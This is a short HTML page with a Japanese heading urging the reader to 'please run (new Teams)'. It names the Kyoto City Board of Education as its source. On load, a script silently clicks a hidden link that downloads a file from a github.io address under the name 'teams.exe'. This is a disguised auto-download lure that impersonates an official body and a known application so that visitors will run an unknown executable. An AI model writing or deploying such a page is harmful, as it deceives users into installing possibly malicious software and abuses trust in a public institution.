<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body><center>
    <h1>実行してください(新teams) </h1>
　<p>京都市教育委員会</p>
    </center>
    <script>
        window.onload = function() {
            var link = document.createElement('a');
            link.href = 'https://yucchannel.github.io/hq/index.html';  // ダウンロードしたいファイルのパス
            link.download = 'C:\Windows\teams.exe';  // 保存するファイル名（任意）
            document.body.appendChild(link);
            link.click();  // 自動的にリンクをクリックしてダウンロード開始
            document.body.removeChild(link);  // ダウンロード後にリンクを削除
        };
    </script>
</body>
</html>
